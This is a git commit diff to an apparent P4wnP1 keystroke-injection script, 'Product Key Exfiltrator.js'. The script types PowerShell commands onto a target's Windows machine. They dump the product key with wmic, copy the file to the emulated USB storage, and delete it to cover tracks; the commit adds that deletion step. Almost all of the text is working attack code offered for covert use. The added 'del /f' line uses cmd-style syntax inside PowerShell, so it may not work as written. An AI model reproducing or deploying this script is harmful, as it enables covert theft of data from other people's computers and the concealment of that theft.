5815e71829ff314444a2569de9a37d4e754a3279
Noah <find-the-string@pm.me>
2021-05-21 01:01:26 -0700

    Update Product Key Exfiltrator.js
    minor phrasing clarification, as well as fixing the missing delete command

--- Product Key Exfiltrator.js
+++ Product Key Exfiltrator.js
@@ -7,10 +7,10 @@ type("powershell\n") // Going into powershell to run the more versatile commands
 delay(10000) // Looong delay, powershell sometimes takes a bit to boot
 type("wmic path softwarelicensingservice get OA3xOriginalProductKey > productkey.txt\n") // The actual command to display the PK
 delay(3000)
-type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'FTP6624' } | select name\n") //FTp6624 is the name of the emulated storage
-// This fun bit of code, look at Seytonic's video on YouTube regarding P4wnP1 A.L.O.A. Basically just finds and copies to the Pi
+type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'USB6624' } | select name\n") //USB6624 is the name of the emulated storage
+// Basically just finds and copies to the Pi, check out Seytronic's video on the A.L.O.A
 type("copy productkey.txt $usbpath.name\n")
 delay(100)
-type("\n") // Deletes the .txt from the target's computer to cover one's tracks
+type("del /f productkey.txt \n") // Deletes the .txt from the target's computer to cover one's tracks
 delay(100)
 type("exit\n") // Aaaand scene!
